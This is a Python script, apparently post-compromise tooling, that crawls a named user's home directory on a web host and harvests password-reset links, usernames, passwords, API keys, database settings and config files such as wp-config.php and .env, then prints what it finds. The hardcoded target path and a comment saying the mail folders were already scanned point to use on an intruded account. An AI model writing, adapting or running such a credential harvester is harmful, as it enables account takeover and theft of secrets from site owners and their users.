import os
import re

def scan_all_files(base_path):
    """Scan semua file di home user untuk cari credential & link reset"""
    results = {
        'reset_links': [],
        'credentials': [],
        'config_files': []
    }
    
    # PATTERN YANG DICARI
    reset_pattern = r'https?://[^\s"\']*(reset|changepw|recover|forgot|password|setpass|key|token)[^\s"\']*'
    cred_patterns = {
        'username': r'(?:username|user|login|email)[\s:=]+([^\s"\']+)',
        'password': r'(?:password|pass|pwd)[\s:=]+([^\s"\']+)',
        'api_key': r'(?:api[_-]?key|secret|token)[\s:=]+([^\s"\']+)',
        'database': r'(?:mysql|database|db|DB_)[\s:=]+([^\s"\']+)',
    }
    config_files = ['wp-config.php', '.env', 'config.php', 'settings.php']
    
    total_files = 0
    for root, dirs, files in os.walk(base_path):
        # SKIP DIRECTORY TERLALU BESAR
        if '/mail/' in root and '/cur/' in root:
            continue  # SKIP MAIL DULU (SUDAH DISCAN)
        
        for file in files:
            filepath = os.path.join(root, file)
            total_files += 1
            
            # CEK EKSTENSI
            ext = file.split('.')[-1].lower()
            if ext not in ['txt', 'log', 'php', 'conf', 'ini', 'env', 'json', 'yml', 'yaml']:
                continue
            
            try:
                with open(filepath, 'r', errors='ignore') as f:
                    content = f.read(50000)  # BACA 50KB AJA BIAR CEPAT
                    
                    # CARI LINK RESET
                    matches = re.findall(reset_pattern, content, re.IGNORECASE)
                    for match in matches:
                        results['reset_links'].append({
                            'link': match,
                            'file': filepath
                        })
                    
                    # CARI CREDENTIAL
                    for cred_type, pattern in cred_patterns.items():
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            results['credentials'].append({
                                'type': cred_type,
                                'value': match,
                                'file': filepath
                            })
                    
                    # CARI FILE KONFIGURASI
                    if file in config_files:
                        results['config_files'].append(filepath)
                        
            except:
                continue
    
    print(f"[+] Total files scanned: {total_files}")
    return results

# ========== MAIN ==========
base = "/home/stppmeda/"
print("[+] Scanning all files in", base)

if not os.path.exists(base):
    print("[-] Path not found!")
    exit(1)

results = scan_all_files(base)

print(f"\n[+] Found {len(results['reset_links'])} reset links:")
for link in results['reset_links']:
    print(f"  📎 {link['link']}")
    print(f"     File: {link['file']}")

print(f"\n[+] Found {len(results['credentials'])} credentials:")
for cred in results['credentials'][:20]:
    print(f"  🔑 {cred['type']}: {cred['value']}")
    print(f"     File: {cred['file']}")

print(f"\n[+] Found {len(results['config_files'])} config files:")
for cfg in results['config_files']:
    print(f"  📄 {cfg}")

print("\n[+] Selesai, ban

sat!")
